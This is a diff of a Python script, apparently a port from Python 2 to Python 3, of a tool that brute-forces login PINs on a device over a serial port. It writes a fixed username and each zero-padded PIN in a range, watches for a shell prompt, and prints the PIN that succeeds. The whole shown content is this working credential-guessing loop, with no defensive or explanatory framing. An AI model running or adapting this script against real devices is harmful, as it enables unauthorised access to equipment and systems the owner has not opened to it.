@@ -21,31 +21,31 @@ ser = serial.Serial("/dev/ttyUSB1", 115200)
 
 # read data from the serial device ser until the first argument is detected
 def recv_until(until, ser):
-    recv = ser.read(len(until))
+    recv = ser.read(len(until)).decode("utf-8")
     while until not in recv:
-	recv = recv + ser.read(1)
+        recv = recv + ser.read(1).decode("utf-8")
     return recv
 
 # read data from the serial device ser until either the first or second argument is detected
 def recv_until_either(until1, until2, ser):
-    recv = ser.read(min(len(until1), len(until2)))
+    recv = ser.read(min(len(until1), len(until2))).decode("utf-8")
     while until1 not in recv and until2 not in recv:
-        recv = recv + ser.read(1)
+        recv = recv + ser.read(1).decode("utf-8")
     return recv
 
-print "We have reached the initial starting point."
-print "If you are hanging here you might want to restart the board"
+print("We have reached the initial starting point.")
+print("If you are hanging here you might want to restart the board")
 recv_until(username_prompt, ser)
-print "Starting to brute force logins!"
+print("Starting to brute force logins!")
 for i in tqdm(range(starting_location, pin_range)):
     pin = max(pin_length - len(str(i)), 0)*"0" + str(i)
-    ser.write(username + "\n")
-    ser.write(pin + "\n")
+    ser.write((username + "\n").encode("utf-8"))
+    ser.write((pin + "\n").encode("utf-8"))
     prompt = recv_until_either(username_prompt, mesh_prompt, ser)
     if mesh_prompt in prompt:
         print("")
-	print("Successful login!")
-	print("Username: {0}".format(username))
-	print("PIN: {0}".format(pin))
+        print("Successful login!")
+        print("Username: {0}".format(username))
+        print("PIN: {0}".format(pin))
         break
 
